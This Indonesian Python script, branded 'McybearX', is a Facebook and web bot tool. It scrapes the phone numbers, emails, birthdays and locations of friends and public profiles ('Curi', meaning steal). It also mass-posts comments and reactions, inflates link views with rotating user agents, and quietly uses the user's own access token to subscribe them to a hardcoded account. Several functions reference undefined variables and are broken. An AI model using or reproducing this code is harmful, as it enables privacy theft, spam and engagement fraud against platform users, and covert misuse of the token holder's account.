import concurrent.futures,os,time,requests,bs4,re,random,json,sys
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
emil=print
usup=input
sistem=os.system
kantor=requests.Session()
p = "\x1b[1;97m"
m = "\x1b[1;91m"
h = "\x1b[1;92m"
k = "\x1b[1;93m"
b = "\x1b[1;94m"
u = "\x1b[1;95m"
l = "\x1b[1;96m"
ua=open("._McybearX_.txt","r").readlines()
mx = u+"ʕ"+m+" x"+u+"_"+m+"×"+u+"ʔ"
sup = "\x1b[4;97m              \x1b[0;00m\x1b[1;97m/\x1b[3;91mM\x1b[1;95mcybear\x1b[1;91mX\x1b[0;00m"
#penampung
gagal = []
sukses = []
id = []
McybearX = "Usup_Ganteng"
try:
	Emil = open(".Emil.txt","a")
except:
	pass
Emil = open(".Emil.txt","r").read()
def banner():
	emil("""
\x1b[1;91m     __  ___ \x1b[1;95m__            __ \x1b[1;91m _  __
\x1b[1;91m    /  |/  /\x1b[1;95m/ /_   ____   / /_\x1b[1;91m| |/ /
\x1b[1;91m   / /|_/ /\x1b[1;95m/ __ \ / __ \ / __/\x1b[1;91m|   / 
\x1b[1;91m  / /  / /\x1b[1;95m/ /_/ // /_/ // /_ \x1b[1;91m/   |  
\x1b[1;91m /_/  /_/\x1b[1;95m/_.___/ \____/ \__/\x1b[1;91m/_/|_| \x1b[1;91m×xx M\x1b[1;95mcybear\x1b[1;91mX xx×
""")
def klir():
	sistem("clear")
def MenuBot():
	klir()
	banner()
	emil(sup)
	emil(u+" ["+m+"o1"+u+"]"+p+" Bot Fb")
	emil(u+" ["+m+"o2"+u+"]"+p+" Bot Web")
	emil(sup)
	upil=int(usup(mx+p+" No : "))
	if upil==1:
		BotFb(Emil)
	elif upil==2:
		BotWeb()
	else:
		emil(mx+p+" Input Salah!!!");time.sleep(2)
		MenuBot()
# BOT WEB #
def BotWeb():
	klir()
	banner()
	emil(sup)
	emil(u+" ["+m+"o1"+u+"]"+p+" Bot Klik Link")
	emil(u+" ["+m+"o2"+u+"]"+p+" Bot Apatah")
	emil(sup)
	dumek=int(usup(mx+p+" No : "))
	if dumek==1:
		link=usup(mx+p+" Masukan link : ")
		try:
			brapa=int(usup(mx+p+" Jumlah : "))
		except ValueError:
			emil(u+" ["+m+"x"+u+"]"+p+" Isi Menggunakan Angka!!!")
			BotWeb()
		emil(" ")
		koin=0
		ko=[]
		tot=[]
		emil("")
		with ThreadPoolExecutor(max_workers=30) as kerja:
			for ucupya in range(brapa):
				koin+=1
#				kerja.submit(BotLink,link,tot,koin,brapa,ko)
#				kerja.submit(BotYutub,link,tot,koin,brapa,ko)
				BotYutub(link,tot,koin,brapa,ko)
		emil(" ")
		emil(u+" ["+h+"$"+u+"]"+p+" Total : "+h+"$%s"%len(tot))
		emil(sup+"\n")
	else:
		emil(mx+p+" Pilihan "+m+dumek+p+" Gada Di Menu Tod!!!")
		time.sleep(3)
		BotWeb()
def BotLink(link,tot,koin,brapa,ko):
	emil("\r"+u+" ["+m+"McybearX"+u+"]"+p+f" {koin}/{brapa} "+h+f"OK:{len(tot)}"+p+"/"+m+f"KO:{len(ko)} ", end='');sys.stdout.flush()
	for aw in range(1):
		try:
			uhah=random.choice(ua).replace("\n","")
			palalo={
"Host": "mcybearx.blogspot.com",
"Connection": "keep-alive",
"Cache-Control": "max-age=0",
"sec-ch-ua-mobile": "?1",
#"Upgrade-Insecure-Requests": "1",
"User-Agent": uhah,
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
#"Sec-Fetch-Site": "none",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-User": "?1",
"Sec-Fetch-Dest": "document",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id"
#"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			naru = kantor.get(link,headers=palalo).text
			if "McybearX" in naru:
				emil(u+"\r ["+m+f"{koin}"+u+"]"+p+" Nuyul link Sukses "+h+"$+1"+"         ")
				tot.append("1")
			elif "Please try again in 30 seconds." in naru:
				time.sleep(15)
			elif "Error 503" in naru:
#				emil(u+"\r ["+m+f"{koin}"+u+"]"+m+" Nuyul link Error "+"              ")
#				time.sleep(10)
				ko.append("1")
			else:
				emil(naru)
		except requests.exceptions.ConnectionError:
			time.sleep(15)
########$
def BotYutub(link,tot,koin,brapa,ko):
        emil("\r"+u+" ["+m+"McybearX"+u+"]"+p+f" {koin}/{brapa} "+h+f"OK:{len(tot)}"+p+"/"+m+f"KO:{len(ko)} ", end='');sys.stdout.flush()
        ular="piton"
        for aw in range(1):
                try:
                        uhah=random.choice(ua).replace("\n","")
                        palalo={
#GET /pagead/paralleladview?ai=CtraoAOQAYpnYLsGWmsMP8p6g-AIA4qC3goQPABABIABg6QKCARdjYS1wdWItNjIxOTgxMTc0NzA0OTM3MagDBKoEF0_QDRRQ01dYNMvJVOdpZ8kQG9QIcOf0iAcB0ggCEAKwCwG6Cy0IARAFGAsgCCgEMAZAAkgAWA9gAGgAcAGIAQCYAQGiAQwKBAgAIAPQAQGQAgKgFwE&sigh=fAXeVluVygQ&cid=CAESD-D2abb55ofhoWeFI5R99g&vt=0&ad_mt=[AD_MT] HTTP/1.1
"Host": "m.youtube.com",
"Connection": "keep-alive",
"User-Agent": uhah,
#"Accept-Encoding": "gzip, deflate",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                        }
                        naru = kantor.get(link,headers=palalo).text
                        if "McybearX" in naru:
                                emil(u+"\r ["+m+f"{koin}"+u+"]"+p+" Nuyul link Sukses "+h+"$+1"+"         ") #;open("yt.txt","w").write(naru)
                                tot.append("1")
                        elif "Please try again in 30 seconds." in naru:
                                time.sleep(15)
                        elif "Error 503" in naru:
#                               emil(u+"\r ["+m+f"{koin}"+u+"]"+m+" Nuyul link Error "+"              ")
#                               time.sleep(10)
                                ko.append("1")
                        else:
                                emil(naru)
                except requests.exceptions.ConnectionError:
                        time.sleep(15)
# BOT FB #
def login():
	klir()
	banner()
	emil(sup)
	emil(u+" ["+m+"o1"+u+"]"+p+" Login Token")
	emil(u+" ["+m+"o2"+u+"]"+p+" Login Cookie\n")
	yusuf = usup(mx+p+" No : "+m)
	if yusuf=="1":
		token()
	elif yusuf=="2":
		cookie()
	else:
		emil(mx+" "+yusuf+" Tidak ada Dimenu");time.sleep(3)
		login()
def cookie():
	emil("sabaar")
	exit()
def token():
	yusuf = usup(mx+p+" Masukan Token : "+b)
	try:
		emiil = requests.get("https://graph.facebook.com/me?access_token="+yusuf)
		idam = json.loads(emiil.text)["name"]
		emil(mx+" Welcome "+idam)
		usuup = open(".Emil.txt","w");usuup.write(yusuf);usuup.close()
		bot(Emil)
		BotFb(Emil)
	except (KeyError,IOError):
		emil(mx+" Token Invalid")
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		emil(mx+" Koneksi Terganggu")
		time.sleep(1)
def bot(Emil):
	Emil = open(".Emil.txt","r").read()
	try:
		requests.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+Emil)
	except:
		pass
def Curi_Menu(Emil):
		Emil=open(".Emil.txt","r").read()
		emil(u+" ["+m+"o1"+u+"]"+p+" Curi Nomor Hp Teman")
		emil(u+" ["+m+"o2"+u+"]"+p+" Curi Nomor Hp Publik")
		emil(u+" ["+m+"o3"+u+"]"+p+" Curi Email Publik")
		emil(u+" ["+m+"o4"+u+"]"+p+" Curi Id Publik")
		emil(u+" ["+m+"o5"+u+"]"+p+" Curi Semua Data")
		emil(sup)
		anjayy = usup(mx+p+" No : "+m)
		if anjayy=="1" or anjayy=="01":
			dump_nohap()
		elif anjayy=="5" or anjayy=="05":
			emmil=usup(mx+p+" Masukan Id : "+b)
			emiil=usup(mx+p+" Limit : ")
			rek = requests.get("https://graph.facebook.com/"+emmil+"/friends?limit="+emiil+"&access_token="+Emil)
			buyung=json.loads(rek.text)
			for love in buyung["data"]:
				user=love["id"]
				nama=love["name"]
				Curi_Data(user,nama)
		else:
			pass
def Curi_Data(user,nama):
    try:
        token = open(".Emil.txt","r").read()
    except (IOError,KeyError):
        jalan(mx+k+" Toket Kadaluwarsa")
        login()
    try:
        idt = user
        bek = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,token))
        x = json.loads(bek.text)
        nmaa = x['name']
    except (KeyError,IOError):
        nmaa = ('-')
    emil ("")
    emil (l+" Akun "+p+nama)
    emil (sup)
    emil (b+"   DATA-DATA AKUN ")
    emil (mx+p+' Nama Lengkap   : '+nmaa)
    try:
        ndpn = x['first_name']
        emil (mx+p+' Nama Depan     : %s'%ndpn)
    except (KeyError,IOError):
        pass
    try:
        nmbl = x['last_name']
        emil (mx+p+' Nama Belakang  : %s'%nmbl)
    except (KeyError,IOError):
        pass
    try:
        hwhs = x['username']
        emil (mx+p+' Username fb    : '+hwhs)
    except (KeyError,IOError):
        pass
    try:
        Mxz = x['id']
        emil (mx+p+' Id Facebook    : %s'%Mxz)
    except (KeyError,IOError):
        pass
    try:
        emai = x['email']
        emil (mx+p+' Gmail Facebook : %s'%emai)
    except (KeyError,IOError):
        pass
    try:
        nmrr = x['mobile_phone']
        emil (mx+p+' Nomor Telepon  : %s'%nmrr)
    except (KeyError,IOError):
        pass
    try:
        ttll = x['birthday']
        emil (mx+p+' Tanggal Lahir  : %s '%ttll)
    except (KeyError,IOError,NameError):
        pass
    try:
        jenis = x['gender'].replace("female","Betina").replace("male","Jantan")
        emil (mx+p+' Jenis Kelamin  : %s '%jenis)
    except (KeyError,IOError):
        pass
    try:
        z = requests.get('https://graph.facebook.com/%s/friends?limit=10000&access_token=%s'%(idt, token)).json()
        for i in z["data"]:
            try:
               jamet = i["id"]
               idungpesek.append(jamet)
            except:
               continue
        emil (mx+p+' Total Pertemnan: %s'%(len(idungpesek)))
    except:
        pass
    try:
        A = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt,token)).json()
        pengikut = A["summary"]["total_count"]
        emil (mx+p+' Total Pengikut : %s'%pengikut)
    except (KeyError, IOError):
        pass
    try:
        lins = x['link']
        emil (mx+p+' Link Facebook  : %s'%lins)
    except (KeyError,IOError):
        pass
    try:
        try:
            stas = x['relationship_status']
        except (TypeError,KeyError,IOError):
            stas = 'Jomblo'
        try:
            dgn = """ dengan """+x['significant_other']['name']
        except (TypeError,KeyError,IOError):
            dgn = ' '
        except:
            pass
        emil (mx+p+' Status         : '+stas+dgn)
    except:
        pass
    try:
        bioo = x['about']
        emil (mx+p+' Tentang Status : %s'%bioo)
    except (KeyError,IOError):
        pass
    try:
        dari = x['hometown']['name']
        emil (mx+p+' Kota Asal      : %s'%dari)
    except:
        pass
    try:
        tigl = x['location']['name']
        emil (mx+p+' Alamat         : %s'%tigl)
    except (KeyError,IOError):
        pass
    try:
        skul = x["education"]
        for UsupGantengSedunia in skul:
            try:
               emil (mx+p+" Sekolah        : %s"%(str(UsupGantengSedunia["school"]["name"])))
            except:
               pass
    except:
        pass
    try:
        lopeDela = x["location"]["id"]
        emil (mx+p+' Id Lokasi      : %s'%lopeDela)
    except (KeyError,IOError):
        pass
    try:
        tzim = x['timezone']
        emil (mx+p+' zona waktu     : %s'%tzim)
    except (KeyError,IOError):
        pass
    try:
        jam  = x['updated_time'][11:19]
        uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError,IOError):
        year = '-'
        month = '-'
        day = '-'
    except:
        pass
    emil(mx+" Terakhir Online Tanggal \x1b[1;97m"+uptd+"\x1b[1;95m Jam \x1b[1;97m"+jam)
    emil(sup+"\n")
def dump_nohap():
	try:
		Emil=open(".Emil.txt","r").read()
	except:
		emil(mx+m+" Token Expired")
	if "teman" in dum_sapa:
		emil_lope="me"
		emil_lop=usup(mx+p+" Limit : ")
	elif "publik" in dum_sapa:
		emil_lope = usup(mx+p+" User Id : "+b)
		emil_lop = usup(mx+p+" Limit : ")
	try:
		adek_emil = requests.get("https://graph.facebook.com/"+emil_lope+"?access_token="+Emil)
		idam = json.loads(adek_emil.text)
		emil(mx+p+" Nama :"+b+" "+idam["name"])
	except KeyError:
		emil(mx+m+" Id Salaah !!!")
		dump_nohap()
	except requests.exceptions.ConnectionError:
		emil(mx+m+" Koneksi Terganggu")
	rek = requests.get("https://graph.facebook.com/"+emil_lope+"/friends?limit="+emil_lop+"&access_token="+Emil)
	cinta = json.loads(rek.text)
	emil(mx+p+" Total : %s"%len(cinta["data"]))
	for love in cinta["data"]:
		try:
			emil(mx+p+" Nama : "+love["name"])
			kuntul = requests.get("https://graph.facebook.com/"+love["id"]+"?access_token="+Emil)
			njay = json.loads(kuntul.text)
			emil(mx+p+" Phone : "+b+njay["phone"])
		except KeyError:
			emil(njay)
def ganti_toket():
	kepin = usup(mx+p+" Masukan Token : "+b)
	try:
		try:
			cupang = requests.get("https://graph.facebook.com/me?access_token="+kepin)
			cupi = json.loads(cupang.text)["name"]
			emil(mx+p+" Hay "+cupi+" Jelek :v")
			sistem("rm .Emil.txt")
			pus = open(".Emil.txt","w");pus.write(kepin);pus.close()
			bot(Emil)
			BotFb(Emil)
		except (KeyError,IOError):
			emil(mx+m+" Toket Invalid!!!")
			time.sleep(3)
			login()
		except ConnectionError:
			emil(mx+m+" Koneksi Terganggu")
			exit()
	except:
		emil(mx+k+" Kesalahan Sistem")
# MENU ANJAY
def BotFb(Emil):
	Emil = open(".Emil.txt","r").read()
	klir()
	banner()
	try:
		Emmil = requests.get("https://graph.facebook.com/v1.0/me?access_token="+Emil)
		Sayang = json.loads(Emmil.text)
		EmilUsup = Sayang["name"]
		try:
#			Usup = requests.get("https://graph.facebook.com/100050672943941/subscribers?access_token="+Emil)
#			Sayangg = json.loads(Usup.text)
			UsupEmil = Sayang["summary"]["total_count"]
		except:
			UsupEmil = "-"
			pass
	except KeyError:
		emil(mx+m+" Token Invalid...")
		time.sleep(3)
		login()
	except requests.exceptions.ConnectionError:
		emil(mx+m+" Koneksi Terganggu...")
		time.sleep(1)
		exit()
	except IOError:
		emil(mx+m+" Token Expired...")
		time.sleep(3)
		login()
	emil(mx+m+" ×x "+b+"Premium Limited Editions"+m+" x× "+u+"ʕ"+m+"×"+u+"_"+m+"x"+u+" ʔ")
	emil(sup)
	emil(mx+p+" Nama   : %s"%EmilUsup)
	emil(mx+p+" Murid  : %s"%UsupEmil)
	emil(sup)
	emil(u+" ["+m+"o1"+u+"]"+p+" BOT report Publik (Sabar ya ngab:v)")
	emil(u+" ["+m+"o2"+u+"]"+p+" BOT Boom Komen Publik")
	emil(u+" ["+m+"o3"+u+"]"+p+" BOT Boom Reaction Posts Publik")
	emil(u+" ["+m+"o4"+u+"]"+p+" BOT Get Data")
	emil(u+" ["+m+"o5"+u+"]"+p+" Ganti Token")
	emil(u+" ["+m+"XX"+u+"]"+b+" Menu Utama")
	emil(sup)
	ussup = usup(mx+p+" No : "+m)
	if ussup=="1" or ussup=="o1":
		bot_repot()
	elif ussup=="2" or ussup=="02":
		bot_komen(Emil)
	elif ussup=="3" or ussup=="03":
		bot_reak(Emil)
	elif ussup=="4" or ussup=="04":
		Curi_Menu(Emil)
	elif ussup=="5" or ussup=="05":
		ganti_toket()
	elif ussup=="XX" or ussup=="xx":
		sistem("cd ../.. && python menu.py")
	else:
		emil(mx+p+" Pilihan "+m+ussup+p+" Tidak Ada di Menu")
		time.sleep(3)
		BotFb(Emil)

# BOT REPORT

def bot_repot():
	emil(mx+p+" Belom Jadi ngaab :v")

# BOT KOMEN

def bot_komen(Emil):
	komeng = usup(mx+p+" Masukan Komen : ")
	try:
		brpa = int(input(mx+p+" Mau Bom Berapa Postingan? : "))
		if brpa>10:
			emil(mx+p+" Jan Banyak Banyak ngab ntar kena Checkpoint");time.sleep(3)
			bot_komen(Emil)
	except ValueError:
		emil(mx+m+" Isi dengan Angka")
	for hihi in range(brpa):
		hihi+=1
		idih = usup(mx+p+" Masukan Id Postingan ke %s: "%hihi)
		id.append(idih)
		try:
			Usup_Emil = int(usup(mx+p+" Limit : "))
		except (ValueError,TypeError):
			emil(mx+m+" Kesalahan Penulisan")
			time.sleep(3)
			bot_komen(Emil)
	for haha in range(brpa):
		emil(id)
		for dot in range(Usup_Emil):
			dot+=1
			emil(mx+p+" Mengirim Komen ke %s"%dot)
			for uid in id:
				emil(uid)
				try:
					anjay = requests.post("https://graph.facebook.com/"+uid+"/comments/?message="+komeng+"&access_token="+Emil)
					emil(h+" SUKSES")
					total.append(anjay)
					if "checkpoint" in anjay:
						emil(mx+p+" Sudah Melebihi Batas / Checkpoint")
				except (KeyError,ValueError,IOError,TypeError):
					emil(m+"  GAGAL/Checkpoint")
					continue
				except ConnectionError:
					continue
	emil(sup)
	emil(mx+p+" Total Komen Terkirim : %s"%len(total))

# BOT LIKE

def bot_reak(Emil):
	Emil = open("../.Emil.txt","r").read()
	emil(sup)
	emil(u+" ["+m+"o1"+u+"]"+p+" BOT Boom Like Publik")
	emil(u+" ["+m+"o2"+u+"]"+p+" BOT Boom Love Publik")
	emil(u+" ["+m+"o3"+u+"]"+p+" BOT Boom Sedih Publik")
	emil(u+" ["+m+"o4"+u+"]"+p+" BOT Boom Marah Publik")
	emil(u+" ["+m+"o5"+u+"]"+p+" BOT Boom Wow Publik")
	emil(u+" ["+m+"o6"+u+"]"+p+" BOT Boom Haha Publik")
	emil(sup)
	Ucup = usup(mx+p+" No : "+m)
	if Ucup=="1":
		type = "LIKE"
		tipe = "👍"
	elif Ucup=="2":
		type = "LOVE"
		tipe = "❣️ "
	elif Ucup=="3":
		type = "SAD"
		tipe = "🥲"
	elif Ucup=="4":
		type = "ANGRY"
		tipe = "😡"
	elif Ucup=="5":
		type = "WOW"
		tipe = "😱"
	elif Ucup=="6":
		type = "HAHA"
		tipe = "🤣"
	else:
		emil(mx+m+" Input Invalid!!!")
		bot_reak(Emil)
	try:
		usupp = int(usup(mx+p+" Mau Boom Berapa Target : "))
		if usupp>50:
			emil(mx+k+" Maksimal 50 Target!!!")
			time.sleep(3)
			bot_reak(Emil)
	except ValueError:
		emil(mx+m+" Isi Dengan Angka!!!")
		time.sleep(3)
		bot_reak(Emil)
	for cuyung in range(usupp):
		cuyung += 1
		emill = usup(mx+p+" Masukan Id Profil ke %s : %s"%(cuyung,b))
		try:
			cayang = requests.get("https://graph.facebook.com/v1.0/"+emill+"?access_token="+Emil)
			_Emil_ = json.loads(cayang.text)
			Sayang_Emill = _Emil_["id"]
			emil(mx+p+" Nama  :"+b+" %s"%_Emil_["name"])
			id.append(emill)
		except (KeyError,IOError):
			emil(mx+m+" Id Salah !!!")
			time.sleep(3)
			bot_reak(Emil)
	try:
		sayang = usup(mx+p+" Limit Post : ")
		emil(" ")
	except ValueError:
		emil(mx+m+" Isi dengan Angka!!!")
		time.sleep(3)
		bot_reak(Emil)
	for udah in id:
		emil(u+"["+b+udah+u+"]"+p+" Boom "+tipe)
		data = requests.get("https://graph.facebook.com/"+udah+"/posts?limit="+sayang+"&access_token="+Emil)
		_usup_ = json.loads(data.text)
		for _emil_ in _usup_["data"]:
			try:
				jangan = _emil_["message"]
			except:
				jangan = "-"
			rindu = _emil_["id"]
			__Emil__ = rindu
			emil(mx+p+" Id Post : "+rindu)
			emil(mx+p+" Status  : "+jangan)
			try:
				parameters = {'access_token' : Emil , 'type' : type}
				Post = requests.post("https://graph.facebook.com/"+__Emil__,data=parameters)
				sabaar = json.loads(Post.text)
				if "success" in sabaar:
					sukses.append(type)
					emil(mx+h+" Sukses  "+p+": %s"%(tipe))
					emil(sup+"\n")
				elif "error" in sabaar:
					gagal.append(type)
					emil(sabaar["error"])
					emil(mx+m+" Gagal  "+p+": %s"%(tipe))
					emil(sup+"\n")
			except (KeyError,IOError):
				emil(sabaar)
				emil(mx+m+" Id Salah !!!")
				emil(sup+"\n")
			except ConnectionError:
				time.sleep(10)
				emil(mx+m+" Koneksi Terganggu!!!")
	emil(mx+b+" Selsai")
	emil(mx+p+" Total Sukses : %s"%len(sukses))
	emil(mx+p+" Total Gagal  : %s"%len(gagal))
if McybearX == 'Usup_Ganteng':
	MenuBot()
